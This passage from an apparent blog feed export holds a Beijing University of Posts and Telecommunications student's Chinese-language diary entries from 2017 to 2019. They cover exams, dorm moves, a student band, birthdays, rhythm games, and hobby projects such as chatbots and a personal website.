<p>各位看到这篇文章的时候，大概就是我 “奔二” 的开端了。时间飞逝，在这个世界上已经是第二十个年头了，北邮小日记也已经累计写 (shui) 了十七篇了。同时，我感觉差不多也应该找一个女朋友了……</p>
<span id="more"></span>
<p>这是本学期的第一篇小日记，前一个月的时间各种忙的事情，一直也没想起来要写点东西，生日这天总该写一写的。</p>
<p>最近用过我微信公众号的一些人可能感受到了一些微小的变化，没错，输入一些特定的内容会有一点小彩蛋出现ヾ (ﾟ∀ﾟゞ)。其实是接入了一个叫做 “图灵机器人” 的东西，目前我开启了一些自带的功能，包括聊天对话和语料库等内容，大家可以玩玩<sub>不过轻点玩</sub>目前一天只有 100 次调用量……（然而并不打算加量）。</p>
<p>（等下，我好像把功能关掉了，现在只会复读，这里我还没写过文档，忘了咋用了……</p>
<p>打算往公众号上再加一些小东西，至于加些什么，哼哼，暂时保密。</p>
<p>在 QQ 端我也打算搞一些技术性的东西，最近我发现我所在的一些 QQ 群中有人用酷 q 写机器人，功能还非常丰富，感觉很厉害。恰好我有一些 java 基础，于是我就开工了。目前基础功能已经差不多搭好了，等一些娱乐和实用功能写完之后，我就布置到服务器上，开启服务～写的过程，基本上是用到什么，就学什么东西。包括连接池，网页解析，文件解析等，都是当时 java 基础课上没有学到的东西。目前这个项目已经累计有一千多行代码了。</p>
<p>不过看看别人写的，我依然觉得我写的功能太菜了，毕竟，我还实现不了模块化，更不会实现用数据生成图片 -_-</p>
<p>要建的网站也在筹备过程当中，目前正在狂补基础中（顺便，腾讯云的学生优惠好便宜.jpg）。希望能尽快上线吧～上线那天我会给网址的～</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
        <category>生日特别篇</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
        <tag>special</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第十八期</title>
    <url>/2019/11/08/diarys/bupt-18/</url>
    <content><![CDATA[<p>好久没有在这里写东西了！打开公众号后台，发现依然有不少用户在保持收听我的公众号，很惊喜的是在我没发一点干货的几个月的时间内，用户数依然在上涨，看来都在等我，而我是唯一一直在咕咕咕的作者ヾ (ﾟ∀ﾟゞ)、感谢你们的支持！今后我将继续在这里更新文章，无论是否干货，我都会写下去，不枉各位的支持，不要让各位读者们失望鸭～</p>
<p>我估计不会有人记得上一期的内容了 233。</p>
<span id="more"></span>
<p>从这半个学期开始，我们将在本部完成接下来的学习。从沙河迁往本部，颇为费劲，一方面是迁的过程需要大幅度转移自己所有的 “货”，另一方面是迁完了以后需要适应本部的 “新生活”。大概本部宿舍的最大区别就是不再有上床下桌了…… 而且洗澡也要先出一下宿舍。但是，“十八人间” 的体验相当不错，当然，十八人间并不是那种一间屋子摆上九个上下铺的，它是分了一个外屋和三个里屋，我们平均分开住在三个小屋里，每间屋子里有三个上下铺。桌子的分配应当是差不多的，就算睡的屋子里没有桌子，外屋也有相对足够数量的桌子可供使用，柜子也是差不多如此。除了晚上连厕所也断电以外，生活还是蛮滋润的～</p>
<p>学六离新食堂和澡堂比较近，但是离四个教学楼都很远，走过去大约要一刻钟时间，很想搞个自行车来骑…… 本部的游泳馆、乒乓球馆也还没有体验过，羽毛球馆倒是因为上课的原因，已经去过了。由于实习的机会，宿舍旁边的新科研楼也有幸走进过。除此以外，比较宅的我基本上两点一线，没怎么走出过学校，没什么需求啊（叹气.jpg）。</p>
<p>啊对，乐队排练找到了新的地方，嘻嘻。但是宿舍里不好练键盘了 233。</p>
<p>这个学期的课中，实验占了很大的部分，有了一些搭建网站的实验，看上去很好玩，做着感觉非常爽（当然可能是因为我曾经搭过网站嘿嘿嘿），还有一些网络安全知识的应用，深入代码中发掘漏洞，这也是在以前学编程时没有深刻体会到的。这些课程中，我感觉 Web 开发基础是最接近我的需求的，因为我正在搭建网站，需要一点前端的知识。通过动手做下去，方能体会到 CSS 可以做出非常酷炫的美化样式，等到以后学了 JS，就可以做出更加多彩的网页效果来，我很期待我学会的那一天 hhh</p>
<p>当然，理论知识不能丢下。现在我也在针对每一章节的课程整理出一些重要的笔记，与上学期不同的是，我将以 Markdown 的形式发布我的笔记，它们将部署在我的网站上，具体发布时间还没定:-O，不过差不多了，很快就会公布了！（其实是看了一些学长们的 Github Pages 后有感而发，觉得整理一些自己做过的东西，经自己大脑消化过的资料对每个人的帮助都会很大吧。比如我正在把自己编程的一些实用小程序上传到 Github 上ヾ (･ω･`｡)）</p>
<p>也没啥别的可说的，就先说到这里了，我要继续去开发微信公众号了……</p>
<p>（话说为什么关键词老是不能发送多图文）</p>
<p>（有点语无伦次 + 流水账的感觉）</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第十九期</title>
    <url>/2019/12/31/diarys/bupt-19/</url>
    <content><![CDATA[<p>时间好快…… 又一年过去了，按照惯例，到了该做年终总结的时候了。</p>
<span id="more"></span>
<p>这一年好像不怎么写东西了……17-18 年跨年总结时，期数是第 7 期；18-19 年跨年总结时，期数是第 16 期。咋的，平时貌似好像也变忙了（？）</p>
<p>放心，下一年就会有很多东西可写了，而且会有很多干货～</p>
<p>（flag 高高立起）</p>
<p>回头翻翻上两年的 “年终总结”，居然写着写着就到了将近两千字，也是因为刚来学校，有一堆话想说的缘故吧。当然，也有很多内容是值得自己记述且说道的别的大变化，今年也有，只不过少了很多。</p>
<p>回到本部后，生活与沙河相比有了相当大的变化，宿舍大了，人与人之间更加近了；学六离澡堂最近，但仍然需要在室外走上一段距离，到了冬天相当冷；学校周围更加繁华且热闹，我也找到了很多相当不错的餐馆，外卖基本上尝了一圈。这一个学期都快结束了，细数我还没去过的本部地点，好像也就是主楼和游泳馆了（没错，新科研楼我也去过了 —— 在开组会的时候）。</p>
<p>今年秋季学期是学校调整单节课时长的第一个学期，一节课被调整成了 45 分钟，这样上午从 4 节课变成了 5 节课，下午变成了 6 节课。其实这样的安排还好，因为我们没有遇到连续把课放在 5-6 节的安排…… 今年放春节也早，所以看上去我们这学期没上什么课，就放假了…… 虽然如此，但据说我们院仍然是最后放假的，还真就守门院啊……</p>
<p>虽然时间很短，但这学期学的还真不少。信息系统安全实验课上，有教过简单搭建网站的方法，php 网站和 java 网站恰好还都涉及到了，至于如何写前端代码（html+css+javascript），Web 开发基础负责搞定。网络安全课上，教了网络攻击的一些方法和原理，从而弄明白了前几年做的入门实践攻击背后的原理。除了以上这些内容，实践课上有很多系统构建实验，虽然以后可能大部分都用不上，但是很能锻炼阅读开发文档的能力，当然，能够跟着它们做下来，做成功，是非常有成就感的。</p>
<p>信息系统安全老师留了一个安卓小程序作业，我用了大约 3 天搞出来一个用途非常魔鬼的小程序（别问，问就是已经卸掉了）。至于感觉如何，里面的 Service 和 Broadcast 是真的香啊……</p>
<p>i 了 i 了，开发安卓 APP 真的太好玩了，我还要接着做下去ヾ (･ω･`｡)</p>
<p>今年六月份的时候买了一个云服务器，算是更深层次走进网络安全的第一步 —— 动手实践，误打误撞地圆了我小时候的一个愿望 —— 建立网站。申请域名走的是腾讯云的学生套餐 ——cn 域名一年才 8 元它不香吗！当时还想的是搭一个技术博客，分享一些我实际项目中的安全知识。现在它的需求已经扩展了 —— 我还打算布置一些 web api 上去，链接一些我的笔记和心情文章，布置一些下载项目 —— 单一的博客框架不太能满足我了ヾ (･ω･`｡)，不妨从零开始，先做个首页？</p>
<p>由于之前说过，这个学期的笔记大部分是由 markdown 做成的，所以我一直在找一些 markdown 生成 html 的库（谁愿意拿 html 再写一遍页面啊ヽ (ｏ` 皿′ｏ)ﾉ），有幸找到了 mkdocs，但是它功能有限，比如没有评论功能（后来才反应过来那是专门给 docs 生成 html 网页的库…… 哪里用得着评论功能啊喂！得考虑魔改下了…… 要不然估计要从零开始搭评论功能…… 诶，哪个框架不是这么搭起来的呢 233）</p>
<p>现在完成的网页基本都是静态部分。首页都还没怎么布置呢…… 最近也是太忙了。</p>
<p>等我首页做完以后一定尽快公布网址，欢迎过来玩啊😁</p>
<p>今年乐队有什么变化呢？就是我们终于完成了第一次在校外的演出！当然，也有一些新的原创歌曲与大家见面了，我想大家一定都听到了（笑）。有了第一次，就有第二次，第三次…… 停，今年只有三次，不过足够了，虽然没有钱赚，但是至少有了一些名声，外人知道了起源乐队的存在，相信以后可以更加健壮的发展起来。</p>
<p>当然我也要自裁一下，去年总结的时候说要写歌，结果今年除了给原创曲写一个声部外，就没打开过 cubase，当然 FL studio 更没打开过…… 说好的键盘手写歌呢！都是主音吉他手在写啊摔！</p>
<p>而且听说主音吉他手也买了编曲键盘，我再不出手就要被抢 “饭碗” 了……</p>
<p>不说了我继续听歌找感觉去了…… 不出作品我怎么注册网易音乐人啊……</p>
<p>期末早，所以得去复习了（悲），盘点（公历版）到此，结束？</p>
<p>2019.12.31 23：25 写于学六 - 339</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第二期</title>
    <url>/2017/10/19/diarys/bupt-2/</url>
    <content><![CDATA[<p>还记得上一期留下的坑吗？</p>
<p>我估计你们都不会记得了，谁让我偷懒这么久不更新……</p>
<span id="more"></span>
<p>好啦我接着写就是啦～</p>
<p>空了这么多天，我干嘛去了？当然是学习啦，上次写完之后我不是去肝高数和线代了嘛……（认真脸）</p>
<p>（好吧我扯远了） 上次提到，这一期要来讲讲我遇到的一些大佬，噢，不对，是我的同学，他们可谓多才多艺，能歌善舞，琴棋书画样样精通…… 从离我最近的开始说起。在我的宿舍里就有一个，住在我床位对面，是一个电吉他大佬，每天都能听到他练吉他音阶 100 遍（最近可能是 200 遍），偶尔还会叫另外一些大佬到宿舍合练歌曲…… 另外他还会自编伴奏鼓点，让我这个只会自己弹钢琴，还有点不熟的我都有点自愧不如（毕竟好久不练了 (┬＿┬)），好吧，他也会弹钢琴…… 他现在有了要建立乐队的想法，我表示很有兴趣并且很期待能够加入。</p>
<p>随着认识的人越来越多，我发现，这一届会吉他的真多啊… 略慌</p>
<p>除了乐器大神以外，给我印象最深的大概就是技术大佬了，在我们网安院大群里就有这样一位人物。初次在网上遇见他的时候，我误加了网安 801 班的班群（他那会是群主），看到他粉嫩的聊天气泡和很 “萌” 的说话风格，再加上他时不时的在大群里冒出几句技术性词语，我以为他是个女的技术大神。后来得知班委选举那天，是他在前面放的 PPT，顿时感觉颇为受骗┭┮﹏┭┮不只我一个人是这样的感觉啊ヾ (。￣□￣)ﾂ゜゜゜ （我都这么说了他当然是男的了。）</p>
<p>自从进入了技术组之后，我遇到的技术大神简直太多了…… 我这种只会用会声会影的渣渣几乎无法与用 PR、AE 的大佬相提并论，那个一开始的自我介绍视频也算是勉强符合要求，除此以外真是没什么亮点了…… 就算是图片组也十分让我惊讶，p 图技术简直赶超了我不知道有多少条街。我是去找不自在的吗…… 不过，不要虚嘛。</p>
<p>好了，这期到此结束。（我编不下去了）</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第三期</title>
    <url>/2017/11/12/diarys/bupt-3/</url>
    <content><![CDATA[<p>第三期，姗姗来迟～</p>
<p>这几周一直在忙着推别的东西，导致这个系列文章从周更差点变成月更。唉，我真不是懒 ヾ (。￣□￣)ﾂ゜゜゜</p>
<span id="more"></span>
<p>最近在学 c 语言，前一周进行了第一次上机考试，略紧张……5 道题中也只过了两个……（啊，其实本来能过 3-4 道的 QuQ，有一个条件判断写错了格式……）</p>
<img data-src="/2017/11/12/diarys/bupt-3/4.jpg" class="" title="oj">
<p>这次有只需要半小时就把题全部解完的，图片，唉…… 这差距，还是要多多练习啊</p>
<p>（这一波上机考试只有约 40 人参加，所以我排名比较靠前，如果整个院的人都同时参加上机考试的话……）</p>
<p>时间过得好快啊，马上就要到期中考试的时间了。正好前几年的复习资料也送过来了，看了看感觉很懵逼。怎么办好紧张，我还什么都不会…（几近绝望.jpg）</p>
<img data-src="/2017/11/12/diarys/bupt-3/5.png" class="" title="安排">
<p>对了，等期中考过后，一定回高中看一眼～</p>
<p>最近开始疯狂的水活动挣德育分，我又像开学时那样各种跑讲座，参加活动。不过令我印象最深刻的是几个没有德育分的体育比赛。当时我参加了乒乓球和羽毛球比赛，本想凭借我的一些技术闯一闯 “天下”，结果均遭遇一轮游…… 比分甚至大到让我有些怀疑人生。</p>
<p>不过这次宝贵的切磋机会也让我找到了技术的薄弱点，让我接下来的练习有了方向。总之，还是很感谢这次经历吧。</p>
<p>马上就将迎来大学英语四级口试，大概看了一眼它的内容，感觉还是可以的，难度完全在可以接受的范围内。加油吧！</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2017/11/12/diarys/bupt-3/1.jpg" class=""></div><div class="group-picture-column"><img data-src="/2017/11/12/diarys/bupt-3/2.jpg" class=""></div><div class="group-picture-column"><img data-src="/2017/11/12/diarys/bupt-3/3.jpg" class=""></div></div></div>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第四期</title>
    <url>/2017/11/26/diarys/bupt-4/</url>
    <content><![CDATA[<p>各位，又到了我随便写一些东西的时候了，先从乐队开始讲起吧。</p>
<span id="more"></span>
<p>这里面是一群志同道合的想要搞（zhuang）事（bi）情的人，有 7 个人，1 个键盘手 1 个贝斯 1 个鼓手 2 个主唱以及…… 你们看下这张图就知道了。 （只有一个小姐姐差评ー (￣～￣)ξ）</p>
<img data-src="/2017/11/26/diarys/bupt-4/1.jpg" class="" title="乐队图片">
<p>p.s. 现在又多了一个 mixer，我们班的，让我感觉真是大佬云集……</p>
<p>上周四我们进行了首秀，第一波表演是给英语社感恩节活动做暖场，曲目为 Counting stars，非常经典，现场效果也还不错。我会在下一期之前放上表演录像的～</p>
<p>（后期略费劲，因为那蛋疼的清晰度……）</p>
<p>当然，表演结束后不忘了蹭感恩节活动的吃的和喝的，火鸡作为感恩节的一个代表元素，当然是必不可少的了～</p>
<img data-src="/2017/11/26/diarys/bupt-4/3.jpg" class="">
<img data-src="/2017/11/26/diarys/bupt-4/4.jpg" class="">
<p>（大吉大利，今晚真・吃鸡！）</p>
<p>下次打算排个日摇<sub>很期待</sub>据说还会有小哥哥助阵～</p>
<p>还有一件事，也是上周四发生的，那就是期中考试→_→。</p>
<p>当天我们迎来了综合英语和信安导论的考试，题的难度还是可以接受的，英语只有客观题，而且有很多涉及课内单词的部分，以我的水平应该没有问题；但是听力题仍然虚… 有时听完一遍感觉很懵逼，不知道他到底想说些什么，而且还只读一遍… 卷子上没有问题只有回答也是很烦的，特别是给了四个数字的情况下…… 其实我还是想做一做四级的题型的，但是翻译和作文可能就只能自己练了……</p>
<p>下午是信安导论考试，看到题之后感觉心里咯噔一下，简答题的数量并不少，而且分值比较大，不过还好大部分都是我复习过的部分，加上刚学了半个学期，要记的概念比较少，我还能一一应付。前面的选择题我有点虚… 虽然我前几天看过，但是看得太粗，好多具体细节有点不太记得了…… 希望可以错得少点吧。</p>
<p>期中考试还没有结束，下周三将迎来高数期中考，略慌…… 好多公式都还没记住……</p>
<p>还有线性代数没有考呢……</p>
<p>期中加油～溜～</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第五期</title>
    <url>/2017/12/10/diarys/bupt-5/</url>
    <content><![CDATA[<p>期中考试终于都结束了！！有时间写东西啦～</p>
<span id="more"></span>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aplayer/1.10.1/APlayer.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/meting/2.0.1/Meting.min.js"></script><meting-js metin="meting" id="002X3RjI43O8qj" server="tencent" type="song"></meting-js>
<p>分数都还可以，至少都及格了，当然还可以做到更好，这得靠接下来的努力了～</p>
<p>不过，我这些同学，还得往上带一带…… 毕竟作为学委的我还是见识到了不少让人抓狂的情况的…… 跟这里我吐槽一下，作业交得晚、借作业去抄… 都是常事。当然，也有很努力在学习的同学，他们会找我问题，我也会很乐意给出解答，这给我一次运用知识的机会，也增强了我和同学们的交流。对了，借这个当学委的机会我也几乎把全班同学认全了，哦耶！</p>
<p>上周五听说要搬宿舍了，据说原因是另一个校区一整个院的同学都搬了过来，需要腾出一个楼来给其中的女生住，调整方案是说我现在所在楼 - 5 楼的同学要搬到 3 楼去，而 3 楼的女生要搬过来和要住进来的女生并一个楼。如果不出意外的话，这就是我的坐标处于 S5-535 的最后几天了，没想到我之前曾经说过要去 S3 看一看的愿望竟然这么快就实现了 hhh，但是我这么多东西该怎么搬啊……</p>
<p>时间过得也太快了点，6 天以后就是大学英语四级考试了，怎么办，我翻译题还一道都没看过呢……</p>
<p>游园会等多收点照片以后再写～嘿嘿嘿那可是十分有趣的活动啊～</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第六期</title>
    <url>/2017/12/15/diarys/bupt-6/</url>
    <content><![CDATA[<h2 id="特别篇-搬家小故事">特别篇 - 搬家小故事</h2>
<p>首先更正我之前一期中的一个小错误，最后我们的坐标是在 S2，而并非 S3。不过这个位置离教学楼和食堂真的近多了，可以晚起一小会了～</p>
<span id="more"></span>
<img data-src="/2017/12/15/diarys/bupt-6/1.jpg" class="" width="250" height="250">
<img data-src="/2017/12/15/diarys/bupt-6/3.jpg" class="" width="250" height="250">
<p>周六上午我先去考了四级，所以我搬东西的时间就集中在了周六下午。我的东西并不算多，不过由于劲儿小，也没有小推车，来回次数很多。所有的书我是用背包背过去的，衣服是装在编织袋里拿过去的，洗脚的盆就端着吧…（吐个小槽：统一发的编织袋手感体验极差ー (￣～￣)ξ）</p>
<p>累死累活来回了几趟，感觉真的像在搬家…… 没有任何人帮忙，我也没叫家长过来，而且这次真的将整套生活用品全搬了过去，因为我们原来的屋要住进女生…… 不过在搬的过程中，S2-S5 中间的过道都是通的，所以我们不用下楼，从楼里就可以过去，也省了相当一大部分劲呢ヾ (･ω･`｡) 搬完之后，也不忘把原来的住处打扫了一遍，尽量恢复到了我们刚搬进去时的状态，算是善始善终吧…… 除此之外，我们还给准备住在这里的女生留了些礼物（嘿嘿），我对面床的同学留了一个闹钟和熊，我则留了一个气球<sub>希望以后住在 S5-535 的小仙女们能够开心吶</sub>整个连搬带打扫的过程大约有三个多小时，真是好累噢……</p>
<img data-src="/2017/12/15/diarys/bupt-6/2.jpg" class="" width="250" height="250">
<p>S2 是个小楼，一层楼只有一个厕所和水房，而且之前没人住过，床上全是木屑，地上还全是灰，有一种开荒的感觉…… 我怎么就那么羡慕那些要搬到 S3 的人呢！</p>
<p>第二天早上我是 8 点钟醒的，半个小时之后，楼道里居然开始响起音乐，而且还几乎都是钢琴纯音！看来放歌的人跟我口味很像啊（滑稽）… 好听是确实的，但就是声音大了些…</p>
<p>这天上午，我和我的一个室友去帮我们班女生搬东西，女生的东西确实琐碎，小物件十分多，虽然不重，但是仍然来回了好几趟（床板有班长来搬呢，我这么小的身板怎么搬得动床板呢ー (￣～￣)ξ 从我的角度来说，东西确实不重）。当然，在帮助过程中我们也尽量贡献出我们的力量，能搬的基本上都扛在了我们的肩上，虽然略累，但是我们是很快乐的。 （估计我们班其他男生还在睡大觉呢吧……）</p>
<p>当我们在新宿舍落定后，我们也陆续收到了一些搬过去的人对我们的评价，大部分非常好，小部分吐槽。不过有些人确实有点着急了，不是说他们不应该说出来，而是在于表达的方式，在发空间或朋友圈之前，有没有想到联系当事人自行处理呢？就算联系不到，借助下中间人，创建一个讨论组，在里面互相说一说，也是可以的。好在这次事件还是和平解决了。</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
        <tag>special</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第七期</title>
    <url>/2017/12/30/diarys/bupt-7/</url>
    <content><![CDATA[<p>大家好，当你们看到这篇推送时，已经进入 2018 年了。首先祝所有陪伴我的人新年快乐。我就不再一个人一个人的发消息了<sub>（群发的反正你也不回是不是</sub>）</p>
<p>现在是 2018 年 1 月 1 日，期末考试将在不到一个月内举行，届时，我将面临大学中的第一次必修课期末测试，这是继期中考过后的第二次大型考试，将是对我知识掌握情况的一个检验。在最近的一段时间内，期末考试复习已经被我写入了 ddl 中，面对着还没有经手过的复习资料，我提醒自己：必须要抓紧了。</p>
<p>不过，到了年终，总是想写点东西总结总结的，于是作业之余，我选择坐在电脑前，把这些文字敲出来……</p>
<span id="more"></span>
<p>四个月前的我刚刚以双培生的身份踏入北邮，一切对我来说都是全新的。舍友、教室、食堂… 恨不得一下子体验个遍；也想过要马上见到全班同学，把同班同学都认全……（那时还没有把目标放在全院）后来才知道，远没有那么容易。现在名字我倒是都熟，但是对错脸的现象还是太多（捂脸），可能是课少的原因？（初、高中所有的课都是一起上，并且每天的课都是平均的，所以同学间见面的次数会多些）不过借着学委工作的机会，我也在尽量努力（毕竟可以收个作业做个签到什么的）…（哇顺便吐个槽，我们班男女同学之间的交流实在太少了… 都一起上了半学期课居然还有人在问我 xxx 是不是我们班的……）</p>
<p>我清楚的记得三个月前的大班委竞选，我 “战略性” 地选择了放弃，因为我对大班的了解程度不够，加上我也没有做什么准备，对于竞选成功没有十足的把握。但我看到我们班接二连三有人上去做演讲，我就有点后悔了，因为 “机会也是靠自己争取的”，想要在大班前有所表现，那就要自己抓住每次表现的机会。基于这样的想法，之后的小班委竞选和院学生会招新我就不会再放过了，小班学委和技术部部员是我争取的结果。</p>
<p>做小学委其实是很蛋疼的 -_- 面对着自己班的同学，经常要告诉他们留了些什么作业，还要催他们交作业…… 期中考完试，拿到自己班的成绩，也是基本无话可说，为什么不借着来到北邮双培的机会，努力学习呢？更别提有的人经常不来上课了（他们甚至还被老师点了）……</p>
<p>不过不乏一些努力学习的同学。有的同学经常会找我问些问题，高数和线代的问题我都解答过；其次，就是要求借我笔记抄一抄了，这也算是我在微信公众号里传高数笔记和线代笔记的原因之一吧…… 这样就比较好抄了。不过，现在我也要重新看看我的笔记了，要不然我复习不够，也会忘掉的……</p>
<p>在运动方面，我的乒乓球技术得到了进一步的发展，我有幸遇见了班里的几个大佬，每周可以在一起玩一玩，不过横板打法还是占大多数的，没找到几个直板打法啊…… 还有一位同学，在我那天乒乓球队选拔的时候去看了比赛，然后看到了一个打球的漂亮小姐姐，一下子就被迷住了（滑稽）。为了追小姐姐，他正在跟我们学乒乓球，打得可欢了（嘿嘿嘿）。不过我羽毛球可就菜得多了…… 好久没有约过人打羽毛球了，要生疏了啊……</p>
<p>说一说这学期的课程吧。这个学期还没有什么专业课，周三和周二下午都没有课，周四下午 3-4 节以后就会没课，隔一周周三就没有课，不过作业还是经常有的。高数每周留两次作业，交一次作业；线性代数每隔约三周留下三次作业的量，然后大约三周交一次作业；信安导论每周留一次，交一次；综合英语不定期留作业，但是听力是每周都有的；近代史总共做过两次大作业；思修总共做过三次大作业。总得来说，作业的密度还是可以接受的，然而课程从后半学期就开始难了，有时上课讲一个小时的内容，下课花上差不多两倍的时间甚至都弄不明白，只有硬着头皮查资料，或是问老师。不过经过很长时间的研究后，最后问题还是能够搞明白的。</p>
<p>我比较幸运，遇到了一些很厉害的老师。教我们线性代数的闫浩老师原来是清华的研究生，教我们信安导论的钮心忻老师是《安全简史》的编写者之一，教我们综合英语听说的房印杰老师给很多杂志写过有关英语语法的论文…… 剩下的几位老师也都相当不错。</p>
<p>学习之余便是优质生活，经过思考，我认为写文章是一种非常有意义的消遣，刚好我也有个微信公众号，也不想整天浪费时间在游戏上，就开始了长久的填坑过程。专题大概开了有三个。一开始也不求什么关注，先做一些量的积累，然后才会考虑向外做大一点的宣传。现在这篇文章也是平常的推送之一，只是它是 “特别篇” 罢了，显得比平时长了很多～（话说我院学生会新闻部面试时也谈到了这个经历，学长们表示很感兴趣…… 然后在两边都要二审的时候我选择了技术部ヽ (ﾟ∀ﾟ*)ﾉ━━━ｩ♪不过以后要是作为 freelance writer 给他们写稿子也是很不错的ヾ (Ő∀Ő๑)ﾉ）</p>
<p>让我惊讶的是我以前喜爱玩的音游竟然也找到了组织…… 而且人比我想象中要多得多……</p>
<p>（其实是无意中看到大群里有人发音游成绩截图，然后，emmmm，我就表示了下好奇，然后我们就成为了好友。没记错的话是 10.26 晚上发的）</p>
<p>通过技术部我交了一些好友，桥牌选修课也是，学委群里也是，乐队同样【醒目 - 这次还将有一篇推送 - 与乐队有关】，聊一聊基本上就混熟了。除了网安院，别的院的人，也将陆续被认识。目光不能局限～</p>
<p>这四个月中，我们遇到的活动还是比较多哒<sub>三笙有杏和 “你好，旧时光” 算是其中两个场面最大的活动，也是我参与感最强的两个活动。将会有推送来专门记述这两个活动</sub></p>
<p>文章写到这里，这一部分就差不多了，想说的东西已经都在这里说出来了，最后祝大家在新的一年里，心想事成。</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第八期</title>
    <url>/2018/03/26/diarys/bupt-8/</url>
    <content><![CDATA[<p>我回来了！</p>
<p>先说好，这期没有配图，没有配图，纯文字辛苦读者们了 -_-（明明是懒得找了）</p>
<p>至于很久都没有做推送的原因，大概可以解释成开学事儿多吧，不过，明明越到后面越忙的…… 其实是在推别的东西的时候有些占用啦～</p>
<span id="more"></span>
<p>这学期可以说课表 “充实” 了很多，很多课程都在早上 1-2 节开始有课。在几门专业课开始加码的同时，还要顾及一些高数、大物等学分占比极大的必修课程，除此以外，还要应付双培生必选的 “经济管理” 选修…… 那节选修所在的周二成了一周中最忙的一天。几门课程都有了课下作业，而且规定做完统一交，无疑压缩了我的课余时间，因为我要拿出一部分用来写作业……</p>
<p>新课程的难度是可以意料到的。“面向对象” 的编程思想相当费脑，无穷级数的计算很需要明确的思路，运动学中的微积分表达和计算有点反应不过来，线性表的算法分析一旦稍微走神就再也跟不动了…… 我也看到好多同学都有些吃不消了，上课趴在桌上都睡着了（当然我可不能这样！）。</p>
<p>有些课程还是很有趣的，比如说 “马克思主义基本原理概论” 课，整个感觉像上了一节近代史课。物理实验可以动手实践，也看到了好多中学没看见过的仪器。体育课就可以放松放松了，呼吸下新鲜空气，感受下蓝天白云带给我们清爽的感觉。</p>
<p>寒假四级出分了，虽然过了，但也不是十分突出，还是需要在接下来的六级考试中努把力，得到一个满意的分数。</p>
<p>我所在的乐队也在排新歌，期待最终效果～</p>
<p>愿能在全新的学期有一个全新的体验～</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
      </tags>
  </entry>
  <entry>
    <title>北邮小日记 —— 第九期</title>
    <url>/2018/04/03/diarys/bupt-9/</url>
    <content><![CDATA[<h2 id="特别期-生日大放送">特别期 - 生日大放送</h2>
<p>今天我生日！在大学以来的第一个生日～</p>
<p>早上收到了很多好友的祝福哟（生日说说赞最多依然是常态）~  统一在这里回复你们，我都看到了，感谢你们～</p>
<p>并没有什么聚会（虽然我也不知道会有什么类似于聚会的活动落在我身上），也没吃到蛋糕什么的，但是不用这些我也可以感受到来自你们的热情哦～</p>
<p>当然红包啥的也接到了（偷笑）你们都是有钱人.jpg</p>
<p>离标志成人的日子也满一年了。这一年内的经历也蛮丰富蛮有意义，先是参加过了成人礼和高考，然后是进入大学，认识了更多同学。我在大学的经历当然占了绝大部分时间。在这里，我很快找到了自己的最佳状态，形成了属于自己的 “模式”。</p>
<p>开启新的一岁，希望自己的下一个阶段可以保持这个最佳状态，keep going on~</p>
<p>（下学期的奖学金评选一定要争取到～</p>
<p>谈点其他的～</p>
<p>这一年来没接触什么新游戏，主要都在忙于做谱（有一个上架了好开心<sup>_</sup>），中间捡回的都是我曾经入过坑的老游戏，与整天吃鸡或者王者荣耀的舍友甚至全班男生相比，我算是清流了ヾ (･ω･`｡) 真的说入了什么新游戏的话，那就是音游 Arcaea 了（据说是 “颜值撑起” 的游戏 —— 立绘确实很好看），我是当时听了来自这个游戏的一个钢琴风纯音而入了它的，当一打开时，这个游戏的下落玩法让我眼目一新，因为我从未接触过 3D 下落还带有谱面变速的音游。于是…… 我的空间就多了一堆 Arcaea 的成绩截图。目前研究该游戏的自制谱中，因为这样酷炫的谱面我也想做出来～</p>
]]></content>
      <categories>
        <category>北邮小日记</category>
        <category>Life</category>
        <category>life-in-bupt</category>
        <category>生日特别篇</category>
      </categories>
      <tags>
        <tag>北邮小日记</tag>
        <tag>life-in-bupt</tag>
        <tag>special</tag>
      </tags>
  </entry>
